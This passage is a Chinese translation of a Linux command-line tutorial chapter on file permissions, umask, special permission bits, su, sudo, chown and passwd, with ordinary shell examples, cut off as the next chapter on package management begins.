<td>一个常规文件，由文件所有者可读和可写。文件所有者组的成员可以读取该文件。文件对所有人都是可读的。</td>
</tr>
<tr>
<td>-rwxr-xr-x</td>
<td>一个常规文件，由文件所有者可读、可写和可执行。其他人可以读取和执行该文件。</td>
</tr>
<tr>
<td>-rw-rw—-</td>
<td>一个常规文件，只有文件所有者和文件所有者组的成员可以读取和写入。</td>
</tr>
<tr>
<td>lrwxrwxrwx</td>
<td>一个符号链接。所有符号链接都有“虚拟”权限。实际权限保存在符号链接指向的实际文件中。</td>
</tr>
<tr>
<td>drwxrwx—</td>
<td>一个目录。所有者和所有者组的成员可以进入该目录并在其中创建、重命名和删除文件。</td>
</tr>
<tr>
<td>drwxr-x—</td>
<td>一个目录。所有者可以进入该目录并在其中创建、重命名和删除文件。所有者组的成员可以进入该目录，但不能创建、删除或重命名文件。</td>
</tr>
</tbody></table>
<h4 id="chmod-–-更改文件模式"><a href="#chmod-–-更改文件模式" class="headerlink" title="chmod – 更改文件模式"></a>chmod – 更改文件模式</h4><p>为了更改文件或目录的模式（权限），我们使用 <code>chmod</code> 命令。请注意，只有文件的所有者或超级用户才能更改文件或目录的模式。<code>chmod</code> 支持两种不同的方式来指定模式更改：八进制数字表示法或符号表示法。我们首先讨论八进制数字表示法。</p>
<p><strong>八进制到底是什么？</strong></p>
<p><em>八进制</em>（基数8），及其近亲<em>十六进制</em>（基数16）是常用于计算机上表示数字的数字系统。我们人类，由于我们（或至少大多数人）出生时有10个手指，所以使用基数10的数字系统进行计数。而计算机，从另一方面看，只有一个“手指”，因此它们所有的计数都是使用<em>二进制</em>（基数2）进行的。它们的数字系统只有两个数字，0和1。因此，在二进制中，计数看起来是这样的：</p>
<p>0, 1, 10, 11, 100, 101, 110, 111, 1000, 1001, 1010, 1011…</p>
<p>在八进制中，计数使用数字零到七，如下：</p>
<p>0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21…</p>
<p>十六进制计数使用数字零到九加上字母“A”到“F”：</p>
<p>0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F, 10, 11, 12, 13…</p>
<p>尽管我们可以理解二进制的意义（因为计算机只有一个“手指”），但八进制和十六进制有什么好处呢？答案与人类的方便有关。许多时候，小的数据部分在计算机上表示为<em>位模式</em>。例如，RGB颜色。在大多数计算机显示器上，每个像素由三种颜色组件组成：八位的红色，八位的绿色和八位的蓝色。一个漂亮的中蓝色将是一个24位的数字：</p>
<p>010000110110111111001101</p>
<p>你想整天阅读和写入这些数字吗？我认为不会。这就是另一种数字系统将帮助的地方。十六进制数字中的每个数字代表二进制中的四个数字。在八进制中，每个数字代表三个二进制数字。因此，我们的24位中蓝色可以缩短为一个六位的十六进制数字：</p>
<p>436FCD</p>
<p>由于十六进制数字中的数字与二进制数字中的位“对齐”，我们可以看到颜色的红色分量是43，绿色是6F，蓝色是CD。</p>
<p>如今，十六进制表示法（经常被称为“hex”）比八进制更常见，但正如我们很快会看到的，八进制表示三个二进制位的能力将非常有用…</p>
<p>使用八进制表示法，我们使用八进制数字来设置所需权限的模式。因为八进制数字中的每个数字代表三个二进制数字，这与用于存储文件模式的方案非常匹配。表9-4显示了我们的意思。</p>
<p><em>表 9-4：二进制和八进制中的文件模式</em></p>
<table>
<thead>
<tr>
<th><strong>八进制</strong></th>
<th><strong>二进制</strong></th>
<th><strong>文件模式</strong></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>000</td>
<td>—</td>
</tr>
<tr>
<td>1</td>
<td>001</td>
<td>–x</td>
</tr>
<tr>
<td>2</td>
<td>010</td>
<td>-w-</td>
</tr>
<tr>
<td>3</td>
<td>011</td>
<td>-wx</td>
</tr>
<tr>
<td>4</td>
<td>100</td>
<td>r–</td>
</tr>
<tr>
<td>5</td>
<td>101</td>
<td>r-x</td>
</tr>
<tr>
<td>6</td>
<td>110</td>
<td>rw-</td>
</tr>
<tr>
<td>7</td>
<td>111</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>通过使用三个八进制数字，我们可以为所有者、组所有者和全局设置文件模式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ &gt; foo.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l foo.txt</span><br><span class="line">-rw-rw-r-- 1 me me 0 2016-03-06 14:52 foo.txt</span><br><span class="line">[me@linuxbox ~]$ chmod 600 foo.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l foo.txt</span><br><span class="line">-rw------- 1 me me 0 2016-03-06 14:52 foo.txt</span><br></pre></td></tr></table></figure>

<p>通过传递参数“600”，我们能够设置所有者的权限为读取和写入，同时从组所有者和全局中删除所有权限。虽然记住八进制到二进制的映射可能看起来不方便，但我们通常只需要使用一些常见的组合：7（rwx）、6（rw-）、5（r-x）、4（r–）和0（—）。</p>
<p>chmod 还支持使用符号表示法来指定文件模式。符号表示法分为三个部分。</p>
<ul>
<li>受更改影响的对象</li>
<li>将执行的操作</li>
<li>将设置的权限。</li>
</ul>
<p>为了指定受影响的对象，使用“u”、“g”、“o”和“a”这些字符的组合，如表9-5所示。</p>
<p><em>表 9-5：</em> <em>chmod 符号表示法</em></p>
<table>
<thead>
<tr>
<th><strong>符号</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>u</td>
<td>缩写自“用户”，但意味着文件或目录的所有者。</td>
</tr>
<tr>
<td>g</td>
<td>组所有者。</td>
</tr>
<tr>
<td>o</td>
<td>缩写自“其他人”，但意味着全局。</td>
</tr>
<tr>
<td>a</td>
<td>缩写自“所有”。这是“u”、“g”和“o”的组合。</td>
</tr>
</tbody></table>
<p>如果未指定任何字符，“所有”将被假定。操作可以是“+”，表示要添加权限；“-”，表示要撤销权限；或“&#x3D;”，表示只应用指定的权限，其他所有权限都将被删除。</p>
<p>权限使用“r”、“w”和“x”字符来指定。表9-6提供了一些符号表示法的示例：</p>
<p><em>表 9-6：</em> <em>chmod 符号表示法示例</em></p>
<table>
<thead>
<tr>
<th><strong>表示法</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>u+x</td>
<td>为所有者添加执行权限。</td>
</tr>
<tr>
<td>u-x</td>
<td>从所有者中删除执行权限。</td>
</tr>
<tr>
<td>+x</td>
<td>为所有者、组和全局添加执行权限。这等同于 a+x。</td>
</tr>
<tr>
<td>o-rw</td>
<td>从除所有者和组所有者之外的任何人那里删除读取和写入权限。</td>
</tr>
<tr>
<td>go&#x3D;rw</td>
<td>设置组所有者和除所有者外的任何人具有读取和写入权限。如果组所有者或全局之前有执行权限，它将被移除。</td>
</tr>
<tr>
<td>u+x,go&#x3D;rx</td>
<td>为所有者添加执行权限，并为组和其他人设置读取和执行权限。可以使用逗号分隔多个规定。</td>
</tr>
</tbody></table>
<p>有些人喜欢使用八进制表示法，而有些人真的很喜欢使用符号表示法。符号表示法确实提供了一个优点，即允许我们在不干扰其他任何属性的情况下设置单个属性。</p>
<p>查看 chmod 的 man 页面以获取更多详细信息和选项列表。关于“–recursive”选项的一个警告：它对文件和目录都起作用，因此它并不像我们希望的那样有用，因为我们很少希望文件和目录具有相同的权限。</p>
<h4 id="使用图形用户界面设置文件模式"><a href="#使用图形用户界面设置文件模式" class="headerlink" title="使用图形用户界面设置文件模式"></a>使用图形用户界面设置文件模式</h4><p>现在我们已经了解了如何设置文件和目录的权限，我们可以更好地理解图形用户界面中的权限对话框。在Files（GNOME）和Dolphin（KDE）中，右键点击文件或目录图标将会显示一个属性对话框。以下是来自GNOME的示例：</p>
<p><img src="/images/2024/Picture2.png"></p>
<p><em>图2：GNOME文件权限对话框</em></p>
<p>在这里，我们可以看到所有者、组和全局的设置。</p>
<h4 id="umask-–-设置默认权限"><a href="#umask-–-设置默认权限" class="headerlink" title="umask – 设置默认权限"></a>umask – 设置默认权限</h4><p>umask命令控制创建文件时赋予其的默认权限。</p>
<p>它使用八进制表示法来表示从文件的模式属性中移除的<em>掩码</em>位。我们来看一下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rm -f foo.txt</span><br><span class="line">[me@linuxbox ~]$ umask</span><br><span class="line">0002</span><br><span class="line">[me@linuxbox ~]$ &gt; foo.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l foo.txt</span><br><span class="line">-rw-rw-r-- 1 me me 0 2018-03-06 14:53 foo.txt</span><br></pre></td></tr></table></figure>

<p>首先，我们删除任何旧的foo.txt的副本，确保我们从头开始。接下来，我们运行umask命令而不带参数，以查看当前的值。它回应为值0002（值0022是另一个常见的默认值），这是我们掩码的八进制表示。然后，我们创建一个新的foo.txt文件实例并观察其权限。</p>
<p>我们可以看到所有者和组都有读取和写入权限，而其他人只有读取权限。全局没有写入权限的原因是掩码的值。让我们再次重复我们的示例，这次我们自己设置掩码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rm foo.txt</span><br><span class="line">[me@linuxbox ~]$ umask 0000</span><br><span class="line">[me@linuxbox ~]$ &gt; foo.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l foo.txt</span><br><span class="line">-rw-rw-rw- 1 me me 0 2018-03-06 14:58 foo.txt</span><br></pre></td></tr></table></figure>

<p>当我们将掩码设置为0000（实际上是关闭它）时，我们可以看到文件现在是全局可写的。要理解这是如何工作的，我们必须再次查看八进制数。如果我们将掩码转换为二进制并与属性进行比较，我们就可以看到发生了什么。</p>
<table>
<thead>
<tr>
<th><strong>原始文件模式</strong></th>
<th>— rw- rw- rw-</th>
</tr>
</thead>
<tbody><tr>
<td><strong>掩码</strong></td>
<td>000 000 000 010</td>
</tr>
<tr>
<td><strong>结果</strong></td>
<td>— rw- rw- r–</td>
</tr>
</tbody></table>
<p>暂时忽略前导的零（我们稍后会解释它们），请观察我们的掩码中出现的1的位置，这表示一个属性被移除了 —— 在这种情况下，是全局写入权限。这就是掩码的作用。在掩码的二进制值中，每当出现1，就表示相应的属性被取消设置。如果我们查看掩码值为0022，我们可以看到它的作用。</p>
<table>
<thead>
<tr>
<th><strong>原始文件模式</strong></th>
<th>— rw- rw- rw-</th>
</tr>
</thead>
<tbody><tr>
<td><strong>掩码</strong></td>
<td>000 000 010 010</td>
</tr>
<tr>
<td><strong>结果</strong></td>
<td>— rw- r– r–</td>
</tr>
</tbody></table>
<p>同样，二进制值中每当出现1，相应的属性就被取消设置。尝试使用一些值（尝试一些七）来熟悉这是如何工作的。完成后，请记得进行清理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ rm foo.txt; umask 0002</span><br></pre></td></tr></table></figure>

<p>大多数时候，我们不需要更改掩码；发行版提供的默认设置通常是可以的。然而，在某些高安全性的情况下，我们可能会想要进行控制。</p>
<h3 id="一些特殊权限"><a href="#一些特殊权限" class="headerlink" title="一些特殊权限"></a>一些特殊权限</h3><p>虽然我们通常将八进制权限掩码表示为一个三位数，但从技术上讲，更准确的做法是用四位数来表示。为什么呢？因为除了读取、写入和执行权限外，还有一些其他不太常用的权限设置。</p>
<p>其中之一是 <em>setuid 位</em>（八进制 4000）。当应用于可执行文件时，它将 <em>有效用户 ID</em> 从真实用户（实际运行程序的用户）设置为程序所有者的用户 ID。最常见的情况是，这种权限被赋予超级用户拥有的一些程序。当普通用户运行一个标记为 “<em>setuid root</em>” 的程序时，该程序以超级用户的有效权限运行。这使得程序可以访问通常普通用户无权访问的文件和目录。显然，由于这引发了安全问题，setuid 程序的数量必须尽量减少。</p>
<p>第二个不太常用的设置是 <em>setgid 位</em>（八进制 2000），它与 setuid 位类似，将 <em>有效组 ID</em> 从真实用户的 <em>实际组 ID</em> 更改为文件所有者的组 ID。如果在目录上设置了 setgid 位，目录中新创建的文件将具有目录的组所有权，而不是文件创建者的组所有权。在共享目录中，当共同组的成员需要访问目录中的所有文件时，这是有用的，而不考虑文件所有者的主要组。</p>
<p>第三个是称为 <em>sticky 位</em>（八进制 1000）。这是古老 Unix 的一个遗留特性，当时可以标记一个可执行文件为“不可交换”。在文件上，Linux 忽略 sticky 位，但如果应用于目录，则阻止用户删除或重命名文件，除非用户是目录的所有者、文件的所有者或超级用户。这通常用于控制对共享目录（如 &#x2F;tmp）的访问。以下是使用 chmod 以符号表示法设置这些特殊权限的示例。这是给程序分配 setuid 的示例：chmod u+s <em>程序名称</em> 接下来，这是给目录分配 setgid 的示例：chmod g+s <em>目录名称</em> 最后，这是给目录分配 sticky 位的示例：chmod +t <em>目录名称</em> 在查看 ls 的输出时，您可以确定特殊权限。以下是一些示例。首先，这是一个设置为 setuid 的程序的示例：-rw<strong>s</strong>r-xr-x 这是具有 setgid 属性的目录的示例：drwxrw<strong>s</strong>r-x 这是设置了 sticky 位的目录的示例：drwxrwxrw<strong>t</strong></p>
<h3 id="更改身份"><a href="#更改身份" class="headerlink" title="更改身份"></a>更改身份</h3><p>在不同的时候，我们可能需要采取另一个用户的身份。通常，我们希望获取超级用户权限以执行某些管理任务，但也可能“成为”另一个常规用户，例如测试一个账户。有三种方法可以采用另一个身份。</p>
<ol>
<li>登出并重新以另一个用户的身份登录。</li>
<li>使用 <code>su</code> 命令。</li>
<li>使用 <code>sudo</code> 命令。</li>
</ol>
<p>我们将跳过第一种技术，因为我们知道如何做，而且它没有其他两种的便利性。在我们自己的 shell 会话中，<code>su</code> 命令允许我们假设另一个用户的身份，并启动一个新的 shell 会话，使用该用户的 ID，或者作为该用户发出单个命令。<code>sudo</code> 命令允许管理员设置一个名为 <code>/etc/sudoers</code> 的配置文件，并定义特定命令，允许特定用户在假设的身份下执行。选择使用哪个命令主要取决于您使用的 Linux 发行版。您的发行版可能都包含这两个命令，但其配置可能更倾向于其中一个。我们将从 <code>su</code> 开始。</p>
<h4 id="su-–-用替代用户和组-ID-运行-shell"><a href="#su-–-用替代用户和组-ID-运行-shell" class="headerlink" title="su – 用替代用户和组 ID 运行 shell"></a>su – 用替代用户和组 ID 运行 shell</h4><p><code>su</code> 命令用于以另一个用户的身份启动一个 shell。命令语法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su [-[l]] [user]</span><br></pre></td></tr></table></figure>

<p>如果包括“-l”选项，则生成的 shell 会话是指定用户的<em>登录 shell</em>。这意味着加载了用户的环境并将工作目录更改为用户的主目录。这通常是我们想要的。如果没有指定用户，则默认为超级用户。请注意，（奇怪的是）-l 可以缩写为 -，这是它最常使用的方式。要为超级用户启动一个 shell，我们会这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ su -</span><br><span class="line">Password:</span><br><span class="line">[root@linuxbox ~]#</span><br></pre></td></tr></table></figure>

<p>输入命令后，我们会提示输入超级用户的密码。如果成功输入，会出现一个新的 shell 提示符，指示此 shell 具有超级用户权限（末尾的 # 而不是 $），当前工作目录现在是超级用户的主目录（通常是 &#x2F;root）。进入新的 shell 后，我们可以作为超级用户执行命令。完成后，输入 <code>exit</code> 返回到之前的 shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@linuxbox ~]# exit</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>也可以使用以下方式执行单个命令，而不是启动一个新的交互式命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su -c &#x27;command&#x27;</span><br></pre></td></tr></table></figure>

<p>使用这种形式，将一个单行命令传递给新的 shell 进行执行。重要的是要用引号将命令括起来，因为我们不希望在我们的 shell 中发生扩展，而是在新的 shell 中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ su -c &#x27;ls -l /root/*&#x27;</span><br><span class="line">Password:</span><br><span class="line">-rw------- 1 root root 754 2007-08-11 03:19 /root/anaconda-ks.cfg</span><br><span class="line">/root/Mail:</span><br><span class="line">total 0</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<h4 id="sudo-–-以另一个用户的身份执行命令"><a href="#sudo-–-以另一个用户的身份执行命令" class="headerlink" title="sudo – 以另一个用户的身份执行命令"></a>sudo – 以另一个用户的身份执行命令</h4><p><code>sudo</code> 命令在许多方面都与 <code>su</code> 相似，但还具有一些重要的额外功能。管理员可以配置 <code>sudo</code> 以受控的方式允许普通用户以不同的用户（通常是超级用户）的身份执行命令。特别是，用户可能只被限制于一个或多个特定的命令，而不是其他命令。另一个重要的区别是，使用 <code>sudo</code> 不需要访问超级用户的密码。要使用 <code>sudo</code> 进行身份验证，需要用户自己的密码。例如，假设 <code>sudo</code> 已配置为允许我们运行一个名为 “backup_script” 的虚构备份程序，该程序需要超级用户权限。使用 <code>sudo</code> 可以这样做：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo backup_script</span><br><span class="line">Password:</span><br><span class="line">System Backup Starting...</span><br></pre></td></tr></table></figure>

<p>输入命令后，我们会提示输入我们的密码（而不是超级用户的密码），一旦认证完成，指定的命令就会执行。<code>su</code> 和 <code>sudo</code> 之间的一个重要区别是，<code>sudo</code> 不会启动一个新的 shell，也不会加载另一个用户的环境。这意味着命令不需要与不使用 <code>sudo</code> 时有任何不同的引号。请注意，通过指定各种选项，可以覆盖此行为。同时，请注意，<code>sudo</code> 可以使用 <code>-i</code> 选项启动一个交互式的超级用户会话（类似于 <code>su -</code>）。详细信息请参见 <code>sudo</code> 的 man 页面。</p>
<p>要查看 <code>sudo</code> 授予的权限，使用 <code>-l</code> 选项列出它们：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo -l</span><br><span class="line">User me may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br></pre></td></tr></table></figure>

<h3 id="Ubuntu-和-sudo"><a href="#Ubuntu-和-sudo" class="headerlink" title="Ubuntu 和 sudo"></a>Ubuntu 和 sudo</h3><p>对于常规用户来说，经常遇到的问题之一是如何执行需要超级用户权限的某些任务。这些任务包括安装和更新软件、编辑系统配置文件和访问设备。在 Windows 世界中，通常通过赋予用户管理员权限来实现这一点。这允许用户执行这些任务。但是，它也使得由用户执行的程序具有相同的能力。在大多数情况下，这是可取的，但它也允许<em>恶意软件</em>（如病毒）自由地操纵计算机。</p>
<p>在 Unix 世界中，由于 Unix 的多用户遗产，常规用户和管理员之间一直存在着更大的区别。Unix 采取的方法是仅在需要时授予超级用户权限。为此，通常使用 <code>su</code> 和 <code>sudo</code> 命令。</p>
<p>直到几年前，大多数 Linux 发行版都依赖于 <code>su</code> 来实现这个目的。<code>su</code> 不需要 <code>sudo</code> 需要的配置，而且在 Unix 中，拥有一个 root 账户是传统的。这带来了一个问题。用户会不必要地操作为 root。实际上，有些用户完全以 root 用户的身份操作他们的系统，因为这样可以摆脱所有那些令人讨厌的“权限被拒绝”的消息。这就是将 Linux 系统的安全性降低到 Windows 系统水平的方式。这不是一个好主意。</p>
<p>当 Ubuntu 被引入时，其创建者采取了不同的策略。默认情况下，Ubuntu 禁用了 root 账户的登录（未设置账户密码），而是使用 <code>sudo</code> 授予超级用户权限。初始用户账户通过 <code>sudo</code> 获得完全的超级用户权限，并可以授予后续用户账户类似的权限。</p>
<h4 id="chown-–-改变文件的所有者和组"><a href="#chown-–-改变文件的所有者和组" class="headerlink" title="chown – 改变文件的所有者和组"></a>chown – 改变文件的所有者和组</h4><p><code>chown</code> 命令用于更改文件或目录的所有者和组所有者。使用此命令需要超级用户权限。<code>chown</code> 的语法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chown [owner][:[group]] file...</span><br></pre></td></tr></table></figure>

<p>根据命令的第一个参数，<code>chown</code> 可以更改文件所有者和&#x2F;或文件组所有者。表9-7 提供了一些示例。</p>
<p><em>表9-7：chown 参数示例</em></p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>bob</td>
<td>将文件从其当前所有者更改为用户 bob。</td>
</tr>
<tr>
<td>bob:users</td>
<td>将文件从其当前所有者更改为用户 bob，并将文件组所有者更改为组 users。</td>
</tr>
<tr>
<td>:admins</td>
<td>将组所有者更改为组 admins。文件所有者保持不变。</td>
</tr>
<tr>
<td>bob:</td>
<td>将文件所有者从当前所有者更改为用户 bob，并将组所有者更改为用户 bob 的登录组。</td>
</tr>
</tbody></table>
<p>假设我们有两个用户；janet，她具有超级用户权限，和 tony，他没有。用户 janet 想要从她的主目录复制一个文件到用户 tony 的主目录。因为用户 janet 希望 tony 能够编辑该文件，所以 janet 将复制的文件的所有权从 janet 更改为 tony。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[janet@linuxbox ~]$ sudo cp myfile.txt ~tony</span><br><span class="line">Password:</span><br><span class="line">[janet@linuxbox ~]$ sudo ls -l ~tony/myfile.txt</span><br><span class="line"> -rw-r--r-- 1 root root root 2018-03-20 14:30 /home/tony/myfile.txt</span><br><span class="line">[janet@linuxbox ~]$ sudo chown tony: ~tony/myfile.txt</span><br><span class="line">[janet@linuxbox ~]$ sudo ls -l ~tony/myfile.txt</span><br><span class="line"> -rw-r--r-- 1 tony tony tony 2018-03-20 14:30 /home/tony/myfile.txt</span><br></pre></td></tr></table></figure>

<p>在这里，我们看到用户 janet 将文件从她的目录复制到用户 tony 的主目录。接下来，janet 将文件的所有权从 root（使用 sudo 的结果）更改为 tony。在第一个参数的末尾使用冒号，janet 还将文件的组所有权更改为 tony 的登录组，这恰好是 tony 组。</p>
<p>请注意，在第一次使用 sudo 后，janet 没有被提示输入她的密码。这是因为在大多数配置中，sudo 在几分钟内“信任”我们，直到其计时器到期。</p>
<h4 id="chgrp-–-更改组所有权"><a href="#chgrp-–-更改组所有权" class="headerlink" title="chgrp – 更改组所有权"></a>chgrp – 更改组所有权</h4><p>在旧版本的 Unix 中，chown 命令仅更改文件所有权，而不更改组所有权。为此，使用了一个单独的命令，名为 chgrp。它的工作方式与 chown 非常相似，但限制更多。</p>
<h3 id="行使我们的权限"><a href="#行使我们的权限" class="headerlink" title="行使我们的权限"></a>行使我们的权限</h3><p>既然我们已经了解了这个权限的工作原理，现在是展示它的时候了。我们将演示解决一个常见问题的解决方案——设置一个共享目录。假设我们有两个名为“bill”和“karen”的用户。他们都有音乐收藏，并希望设置一个共享目录，每个人都可以在其中存储他们的音乐文件，格式为 Ogg Vorbis 或 MP3。用户 bill 通过 sudo 具有超级用户权限。</p>
<p>首先需要做的是创建一个组，其中 bill 和 karen 都是成员。使用图形用户管理工具，bill 创建了一个名为 music 的组，并将用户 bill 和 karen 添加到其中：</p>
<p><img src="/images/2024/Picture3.png"></p>
<p><em>图3：使用 GNOME 创建新组</em></p>
<p>接下来，bill 为音乐文件创建目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bill@linuxbox ~]$ sudo mkdir /usr/local/share/Music</span><br><span class="line">Password:</span><br></pre></td></tr></table></figure>

<p>由于 bill 在他的主目录外操作文件，因此需要超级用户权限。创建目录后，它具有以下的所有权和权限：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bill@linuxbox ~]$ ls -ld /usr/local/share/Music</span><br><span class="line">drwxr-xr-x 2 root root 4096 2018-03-21 18:05 /usr/local/share/Music</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，该目录由 root 拥有，并且具有权限模式 755。为了使这个目录可以共享，bill 需要更改组所有权和组权限以允许写入。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bill@linuxbox ~]$ sudo chown :music /usr/local/share/Music</span><br><span class="line">[bill@linuxbox ~]$ sudo chmod 775 /usr/local/share/Music</span><br><span class="line">[bill@linuxbox ~]$ ls -ld /usr/local/share/Music</span><br><span class="line">drwxrwxr-x 2 root music 4096 2018-03-21 18:05 /usr/local/share/Music</span><br></pre></td></tr></table></figure>

<p>这一切意味着什么？这意味着我们现在有一个目录 <code>/usr/local/share/Music</code>，它由 root 拥有，并允许组 music 读取和写入。组 music 的成员有 bill 和 karen；因此，bill 和 karen 可以在目录 <code>/usr/local/share/Music</code> 中创建文件。其他用户可以列出目录的内容，但不能在其中创建文件。</p>
<p>但我们仍然有一个问题。根据当前的权限，Music 目录中创建的文件和目录将具有 bill 和 karen 用户的普通权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bill@linuxbox ~]$ &gt; /usr/local/share/Music/test_file</span><br><span class="line">[bill@linuxbox ~]$ ls -l /usr/local/share/Music</span><br><span class="line">-rw-r--r-- 1 bill bill 0 2018-03-24 20:03 test_file</span><br></pre></td></tr></table></figure>

<p>实际上，有两个问题。首先，该系统上的默认 umask 是 0022，这会阻止组成员写入属于其他组成员的文件。如果共享目录只包含文件，这不会是问题，但由于这个目录将存储音乐，而音乐通常是按艺术家和专辑的层次结构组织的，组成员需要在其他成员创建的目录中创建文件和目录。我们需要更改 bill 和 karen 使用的 umask 为 0002。</p>
<p>其次，由一个成员创建的每个文件和目录将设置为用户的主要组，而不是组 music。通过在目录上设置 setgid 位，可以解决这个问题。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bill@linuxbox ~]$ sudo chmod g+s /usr/local/share/Music</span><br><span class="line">[bill@linuxbox ~]$ ls -ld /usr/local/share/Music</span><br><span class="line">drwxrwsr-x 2 root music 4096 2018-03-24 20:03 /usr/local/share/Music</span><br></pre></td></tr></table></figure>

<p>现在我们测试新的权限是否解决了问题。bill 将他的 umask 设置为 0002，删除之前的测试文件，并创建一个新的测试文件和目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bill@linuxbox ~]$ umask 0002</span><br><span class="line">[bill@linuxbox ~]$ rm /usr/local/share/Music/test_file</span><br><span class="line">[bill@linuxbox ~]$ &gt; /usr/local/share/Music/test_file</span><br><span class="line">[bill@linuxbox ~]$ mkdir /usr/local/share/Music/test_dir</span><br><span class="line">[bill@linuxbox ~]$ ls -l /usr/local/share/Music</span><br><span class="line">drwxrwsr-x 2 bill music 4096 2018-03-24 20:24 test_dir</span><br><span class="line">-rw-rw-r-- 1 bill music 0 2018-03-24 20:22 test_file</span><br><span class="line">[bill@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>现在，文件和目录都是使用正确的权限创建的，允许组 music 的所有成员在 Music 目录内创建文件和目录。</p>
<p>唯一剩下的问题是 umask。必要的设置仅在会话结束前持续，并且必须被重置。在第11章中，我们将探讨如何使 umask 更改为永久设置。</p>
<h3 id="更改您的密码"><a href="#更改您的密码" class="headerlink" title="更改您的密码"></a>更改您的密码</h3><p>本章最后一个我们将讨论的话题是为自己（以及如果您具有超级用户权限，则为其他用户）设置密码。要设置或更改密码，使用 <code>passwd</code> 命令。命令语法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd [user]</span><br></pre></td></tr></table></figure>

<p>要更改您的密码，只需输入 <code>passwd</code> 命令。系统会提示您输入旧密码和新密码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ passwd</span><br><span class="line">(current) UNIX password:</span><br><span class="line">New UNIX password:</span><br></pre></td></tr></table></figure>

<p><code>passwd</code> 命令会尝试强制使用“强”密码。这意味着它将拒绝接受太短、与先前密码相似、是词典中的单词或太容易被猜到的密码。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ passwd</span><br><span class="line">(current) UNIX password:</span><br><span class="line">New UNIX password:</span><br><span class="line">BAD PASSWORD: is too similar to the old one</span><br><span class="line">New UNIX password:</span><br><span class="line">BAD PASSWORD: it is WAY too short</span><br><span class="line">New UNIX password:</span><br><span class="line">BAD PASSWORD: it is based on a dictionary word</span><br></pre></td></tr></table></figure>

<p>如果您具有超级用户权限，可以将用户名作为 <code>passwd</code> 命令的参数来设置其他用户的密码。超级用户还有其他选项，如允许锁定账户、密码过期等。有关详细信息，请参阅 <code>passwd</code> 的 man 页面。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在本章中，我们看到类似 Unix 的系统（如 Linux）如何管理用户权限，以允许对文件和目录进行读取、写入和执行访问。这个权限系统的基本思想可以追溯到 Unix 的早期，它经受住了时间的考验。但是，Unix-like 系统中的原生权限机制缺乏更现代系统的细粒度。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li>维基百科有一篇关于恶意软件的好文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NYWx3YXJl">Malware<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>有许多命令行程序用于创建和维护用户和组。有关更多信息，请参阅以下命令的 man 页面：</p>
<ul>
<li><code>adduser</code></li>
<li><code>useradd</code></li>
<li><code>groupadd</code></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>包管理</title>
    <url>/2024/04/14-package-management/</url>
    <content><![CDATA[<h1 id="第3部分-常见任务和基础工具"><a href="#第3部分-常见任务和基础工具" class="headerlink" title="第3部分 - 常见任务和基础工具"></a>第3部分 - 常见任务和基础工具</h1><h2 id="14-包管理"><a href="#14-包管理" class="headerlink" title="14 - 包管理"></a>14 - 包管理</h2><p>在Linux社区中逗留一段时间后，我们会听到很多关于众多Linux发行版中哪个是“最好”的看法。这些讨论往往非常荒谬，关注的是一些琐碎的事情，比如桌面背景的漂亮程度（有些人因为Ubuntu默认的颜色方案而不使用它！）和其他琐事。</p>
